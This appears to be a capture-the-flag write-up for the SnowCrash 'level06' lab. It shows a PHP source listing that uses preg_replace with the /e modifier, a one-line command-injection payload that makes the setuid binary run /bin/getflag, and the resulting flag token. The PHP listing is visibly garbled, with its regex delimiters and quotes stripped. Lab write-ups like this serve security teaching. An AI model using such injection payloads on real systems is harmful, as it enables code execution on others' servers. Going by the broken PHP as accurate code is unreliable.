# level06

1. Files found in `~/` :

    ```bash
    level06  level06.php
    ```

    ```bash
    level06@SnowCrash:~$ strings level06 | grep level06
    /home/user/level06/level06.php
    ```

2. Analysis of the `level06.php` file

    The `level06` binary can execute php code via the expand (option `e`) of `preg_replace`.

    ```php
    function y($m) { $m = preg_replace(.,  x , $m); $m = preg_replace(@,  y, $m); return $m; }

    function x($y, $z) { 
    $a = file_get_contents($y); 
    $a = preg_replace(([x (.*)])e, y(2), $a); 
    $a = preg_replace([, (, $a); 
    $a = preg_replace(], ), $a); 
    return $a; 
    }
    $r = x($argv[1], $argv[2]); print $r;
    ```

3. Exploitation

    Create a string for `preg_replace` :

    ```bash
    echo '[x ${`/bin/getflag`}]' | ./level06 php://stdin 2>&1 | grep token
    ```

    ```bash
    level06@SnowCrash:~$ echo '[x ${`/bin/getflag`}]' | ./level06 php://stdin 2>&1 | grep token
    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
    ```

4. Token discovered

    The token is : `wiok45aaoguiboiki2tuin6ub`
